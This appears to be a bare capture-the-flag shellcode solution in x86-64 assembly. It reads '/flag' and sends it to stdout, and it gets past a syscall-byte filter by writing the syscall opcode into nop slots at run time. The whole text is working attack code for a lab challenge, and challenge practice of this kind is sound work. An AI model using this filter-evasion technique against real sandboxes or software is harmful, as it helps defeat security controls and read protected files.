.global _start

_start: 
 # open
 mov $2, %rax
 lea flag(%rip), %rdi
 xor %rsi, %rsi
 movb $0xf, 7(%rip)
 movb $0x5, 1(%rip)
 nop
 nop

 # sendfile to stdout (fd=1)
 mov $1, %rdi
 mov %rax, %rsi
 xor %rdx, %rdx
 mov $0x1000, %r10 
 mov $40, %al
 movb $0xf, 7(%rip)
 movb $0x5, 1(%rip)
 nop
 nop

 # exit
 mov $60, %al
 xor %rdi, %rdi
 movb $0xf, 7(%rip)
 movb $0x5, 1(%rip)
 nop
 nop

flag:
  .string "/flag"
